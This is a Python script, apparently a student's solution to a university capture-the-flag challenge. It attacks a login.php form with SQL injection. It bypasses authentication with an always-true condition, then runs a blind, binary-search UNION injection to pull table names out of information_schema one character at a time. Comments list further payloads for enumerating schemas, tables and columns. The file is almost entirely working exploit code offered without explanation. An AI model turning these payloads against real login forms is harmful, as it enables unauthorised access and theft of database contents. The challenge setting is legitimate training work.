
import requests
s = requests.Session()
baseURL = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/"
cookies = {"CHALBROKER_USER_ID":"krm504"}

# geet moar cookiess
myData = {"email":"0' or 1 = 1 -- ", "password":"asdf"}
r = s.post(baseURL + "login.php", cookies=cookies, data=myData)
cookies.update(r.cookies.get_dict())

place = 1

#122-34
max = 123
min = 34

constructedString = ''

# while 1:
#     try:
#         operation = '='
#         character += 1
#         myData = {"email":"0' UNION SELECT 1, 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT IN ('information_schema', 'performance_schema') AND IF(ASCII(SUBSTR(TABLE_NAME, " + str(place) + ", 1) " + operation + " '" + character` + "', 1, 0) LIMIT 1 OFFSET 0 -- ", "password":"asdf"}
#         #print(myData)
#         r = s.post(baseURL + "login.php", cookies=cookies, data=myData)
# 
#         if "Welcome" in r.text:
#             constructedString += chr(character)
#             print(constructedString)
#             place += 1
#             character = min
#         
#         print("Tried: " + chr(character))
#     except:
#         print("moving on")
while 1:
    try:
        character = int((max+min)/2)
        
        operation = '>'
        myData = {"email":"0' UNION SELECT 1, 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT IN ('information_schema', 'performance_schema') AND IF(ASCII(SUBSTR(TABLE_NAME, " + str(place) + ", 1)) " + operation + " " + str(character) + ", 1, 0) LIMIT 1 OFFSET 0 -- ", "password":"asdf"}
        r = s.post(baseURL + "login.php", cookies=cookies, data=myData)
        
        #Check query "if what we get is less than what we have, decrease "
        # INVISIVAL > what we have
        if not "Welcome" in r.text:
            max = character - 1;
        else:
            operation = '='
            myData = {"email":"0' UNION SELECT 1, 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT IN ('information_schema', 'performance_schema') AND IF(ASCII(SUBSTR(TABLE_NAME, " + str(place) + ", 1)) " + operation + " " + str(character) + ", 1, 0) LIMIT 1 OFFSET 0 -- ", "password":"asdf"}
            print(myData)
            r = s.post(baseURL + "login.php", cookies=cookies, data=myData)
        
            #Check query
            if "Welcome" in r.text:
                constructedString += chr(character)
                print(constructedString)
                max = 123
                min = 34
                place += 1
            else:
                min = character + 1;
                    
        print("Tried: " + chr(character))
    except:
        print("moving on")
    
quit()
    
if r.status_code == 200:
    print("200: Okay\n")
    cookies.update(r.cookies.get_dict())
else:
    print("Failed")
    quit()

#See the wite
print("We sent: ", end='')
print(r.request.headers)
print()
print("They sent: ", end='')
print(r.headers)

print(r.text)

#Level One: SELECT TABLE_SCHEMA, 2, 3 FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT IN ("information_schema", "performance_schema")
#Level Two: SELECT TABLE_NAME, 2, 3 FROM information_schema.TABLES where TABLE_SCHEMA = "db_9_a6c585"
#Level Three: SELECT COLUMN_NAME, 2, 3 FROM information_schema.COLUMNS where TABLE_NAME = "docs" AND TABLE_SCHEMA = "db_9_a6c585"

#myData = {"email":"0' UNION SELECT TABLE_NAME, 2, 3 FROM information_schema.TABLES  -- ", "password":"asdf"}
#myData = {"email":"0' UNION SELECT 1, 2, 3 FROM information_schema.TABLES -- ", "password":"asdf"}
